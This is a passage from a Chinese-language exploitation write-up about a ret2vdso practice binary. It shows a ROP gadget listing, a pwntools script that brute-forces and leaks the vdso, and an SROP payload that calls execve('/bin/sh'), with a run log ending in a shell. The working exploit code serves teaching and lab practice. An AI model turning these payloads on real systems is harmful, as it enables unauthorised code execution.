    0x080480b2 : adc byte ptr [eax + 3], bh ; int 0x80
    0x080480c9 : adc byte ptr [eax + 4], bh ; int 0x80
    0x08048102 : adc byte ptr [edi - 0x21], dh ; leave ; ret
    0x080480cb : add al, 0 ; add byte ptr [eax], al ; int 0x80
    0x08048156 : add byte ptr [eax], al ; add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret
    0x080480a3 : add byte ptr [eax], al ; int 0x80
    0x0804809c : add byte ptr [eax], al ; mov ebx, eax ; mov eax, 1 ; int 0x80
    0x08048158 : add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret
    0x0804809d : add byte ptr [ecx + 0x1b8c3], cl ; add byte ptr [eax], al ; int 0x80
    0x080480a1 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80
    0x080480b4 : add eax, dword ptr [eax] ; add byte ptr [eax], al ; int 0x80
    0x080480ff : cld ; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480eb ; leave ; ret
    0x08048100 : cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ea ; leave ; ret
    0x08048104 : fxch st(0), st(1) ; ret
    0x080480bb : in al, dx ; pop ebp ; ret
    0x08048101 : inc ebp ; adc byte ptr [edi - 0x21], dh ; leave ; ret
    0x080480fe : inc ebp ; cld ; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ec ; leave ; ret
    0x080480a5 : int 0x80
    0x08048103 : ja 0x80480e7 ; leave ; ret
    0x08048105 : leave ; ret
    0x08048155 : mov eax, 0 ; mov esp, ebp ; pop ebp ; ret
    0x080480a0 : mov eax, 1 ; int 0x80
    0x080480b3 : mov eax, 3 ; int 0x80
    0x080480ca : mov eax, 4 ; int 0x80
    0x080480fd : mov eax, dword ptr [ebp - 4] ; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ed ; leave ; ret
    0x0804809e : mov ebx, eax ; mov eax, 1 ; int 0x80
    0x080480b0 : mov edx, dword ptr [ebp + 0x10] ; mov eax, 3 ; int 0x80
    0x080480c7 : mov edx, dword ptr [ebp + 0x10] ; mov eax, 4 ; int 0x80
    0x080480ba : mov esp, ebp ; pop ebp ; ret
    0x080480af : or al, 0x8b ; push ebp ; adc byte ptr [eax + 3], bh ; int 0x80
    0x080480c6 : or al, 0x8b ; push ebp ; adc byte ptr [eax + 4], bh ; int 0x80
    0x08048154 : or al, 0xb8 ; add byte ptr [eax], al ; add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret
    0x080480bc : pop ebp ; ret
    0x080480b1 : push ebp ; adc byte ptr [eax + 3], bh ; int 0x80
    0x080480c8 : push ebp ; adc byte ptr [eax + 4], bh ; int 0x80
    0x0804809f : ret
    Unique gadgets found: 36
这时候，不妨试试用`write`函数把vdso给读出来。
### 读取vdso
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import random
    import struct
    import os
    import binascii
    import sys
    import time
    context(arch='i386', os='linux')
    # context.log_level = 'debug'
    elf = ELF("./ret2vdso")
    RANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)
    # RANGE_VDSO  = range(0xf76d9000, 0xf77ce000, 0x1000)
    while(True):
        try:
            sh = process("./ret2vdso")
            vdso_addr = random.choice(RANGE_VDSO)
            sh.send('a' * 132 + 
                    p32(elf.symbols['write']) +
                    p32(0) +
                    p32(1) + # fd
                    p32(vdso_addr) + # buf
                    p32(0x2000) # count
                    )
            sh.recvuntil(p32(0x2000))
            result = sh.recvall(0.1)
            if(len(result) != 0):
                open('vdso.so', 'wb').write(result)
                sh.close()
                log.success("Success")
                exit(0)
            sh.close()
        except Exception as e:
            sh.close()
当你有了vdso之后，就可以使用里面的指令了，然后再用同样的原理进行SROP。
### SROP
    ex@Ex:~/test$ objdump -T vdso.so
    vdso.so:     file format elf32-i386
    DYNAMIC SYMBOL TABLE:
    00001050 g    DF .text    0000000d  LINUX_2.5   __kernel_vsyscall
    00000d50 g    DF .text    000002b2  LINUX_2.6   __vdso_gettimeofday
    00001070 g    DF .text    00000009  LINUX_2.5   __kernel_sigreturn
    00001010 g    DF .text    00000028  LINUX_2.6   __vdso_time
    00000000 g    DO *ABS*    00000000  LINUX_2.5   LINUX_2.5
    00001080 g    DF .text    00000008  LINUX_2.5   __kernel_rt_sigreturn
    00000820 g    DF .text    0000052f  LINUX_2.6   __vdso_clock_gettime
    00000000 g    DO *ABS*    00000000  LINUX_2.6   LINUX_2.6
我们可以直接使用现成的`__kernel_rt_sigreturn`调用。
### getshell脚本
在getshell之前，必须先把vdso.so给读出来，不同的系统vdso.so是不同的。所以我们必须要读出靶机的vdso.so才行。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import random
    import struct
    import os
    import binascii
    import sys
    import time
    context(arch='i386', os='linux')
    # context.log_level = 'debug'
    elf = ELF("./ret2vdso")
    # 这个文件需要先用脚本读出来
    vdso = ELF("./vdso.so")
    str_bin_sh_offset = 0x200
    str_bin_sh_addr = elf.symbols['buf'] + str_bin_sh_offset
    # 0x080480a5 : int 0x80
    int_0x80 = 0x080480a5
    # Creating a custom frame
    frame = SigreturnFrame(kernel='i386')
    frame.eax = constants.SYS_execve
    frame.ebx = str_bin_sh_addr
    frame.ecx = 0
    frame.edx = 0
    frame.eip = int_0x80
    # 注意这里的值也要设置，否则会crash
    frame.cs = 35
    frame.ss = 43
    frame.ds = 43
    frame.es = 43
    frame.gs = 0
    frame.fs = 0
    RANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)
    # RANGE_VDSO  = range(0xf76d9000, 0xf77ce000, 0x1000)
    sh = None
    while(True):
        sh = process("./ret2vdso")
        vdso_addr = random.choice(RANGE_VDSO)
        payload = 'a'*128 + p32(0) + \
                p32(vdso_addr + vdso.symbols['__kernel_rt_sigreturn']) + \
                'c' * 40 * 4 + str(frame) # 并不知道这里为什么要偏移 160 个字节，有点迷
        payload = payload.ljust(str_bin_sh_offset, '\x00') + '/bin/sh\x00'
        sh.send(payload)
        sh.recvuntil('/bin/sh\x00')
        sh.sendline('echo hello')
        result = ''
        # 这里不能用 recvall 否则，即使得到了shell，也会crash
        try:
            result = sh.recv()
        except Exception as e:
            pass
        if(len(result) != 0):
            log.success("Success")
            sh.interactive()
            exit(0)
        sh.close()
上面有几点我需要重点提一下。
第一点：
> frame 在 32 位的时候一定要 kernel='i386' ，而且 cs、ds、ss、es的值一定要正确，否则会crash。
第二点：
> recvall 极易导致 EOFerror，建议不要使用，否则，即使得到了shell，也会crash
第三点：
> 对于payload中，为什么要偏移'c' _40_ 4，这个我也不是很清楚，都是调试出来的。
### 运行实例：
    ex@Ex:~/test$ python2 getshell.py 
    [*] '/home/ex/test/ret2vdso'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    [!] Did not find any GOT entries
    [*] '/home/ex/test/vdso.so'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] Process './ret2vdso' stopped with exit code -11 (SIGSEGV) (pid 31629)
    [+] Starting local process './ret2vdso': pid 31633
    [*] Process './ret2vdso' stopped with exit code -11 (SIGSEGV) (pid 31633)
    [+] Starting local process './ret2vdso': pid 31636
    [*] Process './ret2vdso' stopped with exit code -11 (SIGSEGV) (pid 31636)
    [+] Starting local process './ret2vdso': pid 31639
    [+] Success
    [*] Switching to interactive mode
    $ id
    uid=1000(ex) gid=1000(ex) groups=1000(ex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lpadmin),127(sambashare),129(wireshark),132(docker)
    $
## 总结
又踩了不少坑，或许坑踩多了，就习惯了吧。